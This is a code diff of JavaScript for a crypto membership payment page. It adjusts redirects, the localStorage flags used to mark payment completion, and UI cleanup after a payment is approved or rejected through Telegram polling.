@@ -804,7 +804,7 @@ function completePaymentAnimationUI(redirectUrl) {
     triggerNotification("Verification Successful. Redirecting...", 3000);
 
     setTimeout(() => {
-        window.location.href = redirectUrl || "https://membership.avalonflow.site/dashboard";
+        window.location.replace(redirectUrl || "https://membership.avalonflow.site/dashboard");
     }, 1800);
 }
 
@@ -891,6 +891,11 @@ function startTelegramPolling(targetUser, txHash) {
                         clearInterval(telegramPollInterval);
                         await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");
 
+                        // 1. SET PERMANENT COMPLETION KEYS (Triggers external auto-redirect check)
+                        localStorage.setItem("step_3_paid", "true");
+                        localStorage.setItem("step_3_txn_id", txHash);
+
+                        // 2. WIPE IN-PROGRESS / TEMPORARY KEYS
                         localStorage.removeItem("av_payment_in_progress");
                         localStorage.removeItem(storageKey);
                         localStorage.removeItem(SOURCE_TIMER_KEY);
@@ -905,16 +910,25 @@ function startTelegramPolling(targetUser, txHash) {
                         clearInterval(telegramPollInterval);
                         await acknowledgeTelegramAction(callbackId, messageId, originalText, "❌ REJECTED");
 
+                        // Wipe temporary in-progress flag so reloads restore normal state
                         localStorage.removeItem("av_payment_in_progress");
 
-                        triggerNotification("Transaction verification declined by provider.", 4000);
+                        triggerNotification("Transaction verification declined", 4000);
+                        
+                        // Clean up UI state
                         const statusContainers = document.querySelectorAll("#active-status-container");
                         statusContainers.forEach(container => container.remove());
 
                         const usdtProgress = document.getElementById("usdt-progress");
                         const usdcProgress = document.getElementById("usdc-progress");
+                        const usdtTimer = document.getElementById("usdt-timer");
+                        const usdcTimer = document.getElementById("usdc-timer");
+
                         if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "block";
                         if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "block";
+                        if (usdtTimer) usdtTimer.style.display = "block";
+                        if (usdcTimer) usdcTimer.style.display = "block";
+
                         paymentDone = false;
                         break;
                     }
@@ -943,6 +957,7 @@ async function handlePayClick() {
         await streamPaymentVerificationToTelegram("Instant Paymento Request");
     } catch (err) {
         console.error("Paymento connection error:", err);
+        localStorage.removeItem("av_payment_in_progress");
         paymentDone = false; // Release lock on error
         triggerNotification("Authorization connection error", 3000);
     }
@@ -1095,7 +1110,6 @@ window.addEventListener("DOMContentLoaded", () => {
 
             setTimeout(() => {
                 window.location.replace("https://membership.avalonflow.site/notifications");
-
             }, 3200);
         }
     }
